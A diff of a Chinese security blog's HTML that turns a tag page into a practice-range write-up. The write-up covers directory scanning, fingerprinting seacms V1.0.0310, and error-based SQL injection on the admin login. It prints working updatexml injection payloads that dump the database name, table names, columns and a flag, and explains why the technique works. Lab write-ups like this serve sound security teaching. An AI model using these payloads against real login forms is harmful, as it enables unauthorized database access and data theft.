@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Tag: Raid重组 | Getuid</title>
+  <title>记一次简单的信息搜集 | Getuid</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -59,7 +59,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -171,69 +171,137 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      <!-- ============================ Hero Image =========================== -->
-
-<section id="hero" class="scrollme">
-    <div class="container-fluid element-img" style="background: url(/img/bg_img.jpg) no-repeat center center fixed;background-size: cover">
-        <div class="row">
-            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
-                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
-                    <div>
-                        
-                        <h2>YOU'VE MADE A <span>BRAVE</span> DECISION, WELCOME.</h2>
-                        <p></p>
-                        
-                        <h2></h2>
-                        <p>每一个不曾起舞的日子都是对生命的辜负。</p>
-                        
-
-                    </div>
-                </div>
-            </div>
-            <!-- // .col-md-12 -->
-        </div>
-        <div class="herofade beige-dk"></div>
-    </div>
-</section>
-
-<!-- Height spacing helper -->
-<div class="heightblock"></div>
-<!-- // End height spacing helper -->
-
-<!-- ============================ END Hero Image =========================== -->
-
-
-
-
-<section id="services">
+      
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2021/11/05/2018年美亚杯团赛D部分-Raid重组/">2018年美亚杯团赛D部分:Raid重组</a></h4>
-                            
-                            <p><time datetime="2021-11-05T03:31:23.000Z"><a href="/2021/11/05/2018年美亚杯团赛D部分-Raid重组/">2021-11-05</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-11-28T12:04:32.000Z" itemprop="datePublished">
+          2021-11-28
+      </time>
+    
+    
+    | 
+    <a href='/tags/web/'>web</a>
+    
+    
+</span>
+                <h1>记一次简单的信息搜集</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<h2><span id="一次简单的信息搜集">一次简单的信息搜集</span></h2><p>（掌控者靶场）</p>
+<h3><span id="目录扫描">目录扫描</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Tips:</span><br><span class="line">信息收集作为渗透测试的第一步，能决定后续测试的走向，甚至能直接找到目标的漏洞，那么如何才能在繁杂的网络世界里找到所需的数据呢？</span><br><span class="line">尤里开始了努力……</span><br><span class="line">最终他找到了目标的……</span><br><span class="line">成功掌握了这一技能</span><br></pre></td></tr></table></figure>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>季节总是要走向金黄，少年也终将成为宝藏，这吹不出褶的平淡日子，你也是别人的光！</p>
+<p><img src="image-20211128200929465.png" alt="image-20211128200929465"></p>
+<p>直接扫目录就能得到flag，但这里flag在二级目录里，扫了半天没找到(字典太垃圾了&gt;’’&lt;)</p>
+<p><img src="image-20211128201122618.png" alt="image-20211128201122618"></p>
+<p><img src="image-20211128201130192.png" alt="image-20211128201130192"></p>
+<p>下一步信息搜集</p>
+<p>还是这个网站</p>
+<h3><span id="网站指纹查询与利用">网站指纹查询与利用</span></h3><p>Tips:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">经过上次的事件，尤里深刻了解到信息收集的重要性，这次他决定利用信息收集轻松搞定个站点……</span><br><span class="line"></span><br><span class="line">这个cms好像有个sql注入漏洞，找到它，拿到数据库里的flag吧！</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211128201431728.png" alt="image-20211128201431728"></p>
+<p>成功找到网站指纹，seacms版本 V1.0.0310，可以指纹信息搜寻对应的漏洞</p>
+<p>这样的话就是把cms源码下下来分析，确定后台登录的大致路径，然后扫描目录找后台地址，</p>
+<p><img src="image-20211128214951997.png" alt="image-20211128214951997"></p>
+<p>其实谷歌语法更快一些</p>
+<p><img src="image-20211128205347059.png" alt="image-20211128205347059"></p>
+<p><img src="image-20211128220217154.png" alt="image-20211128220217154"></p>
+<h3><span id="后台登录页面sql报错注入">后台登录页面sql报错注入</span></h3><p>尝试发现有sql注入点，</p>
+<p>暴库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;password=aaaaa&amp;login=yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211128222157299.png" alt="image-20211128222157299"></p>
+<p>暴表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)#&amp;password=aaaaa&amp;login=yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211128222143513.png" alt="image-20211128222143513"></p>
+<p>暴字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),0x7e),1)#&amp;password=aaaaa&amp;login=yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211128222418499.png" alt="image-20211128222418499"></p>
+<p>暴数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&#x27; or updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)#&amp;password=aaaaa&amp;login=yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211128222529161.png" alt="image-20211128222529161"></p>
+<p>补充：</p>
+<p>MYSQL updatexml()函数报错注入解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line"></span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>
+
+<p>PS：高版本的mysql已经修复了该bug</p>
+<p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()，这两个函数的用法基本一样，只不过前一个是查询，第二个是修改</p>
+<p>我们要学习的便是mysql里的修改函数即<strong>updatexml函数</strong></p>
+<p>updatexml函数第二个参数 xml中的位置是可操作的地方，xml文档中修改的字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2021/11/19/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-kioptrix-level2/">
+        kali渗透测试:kioptrix level2 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
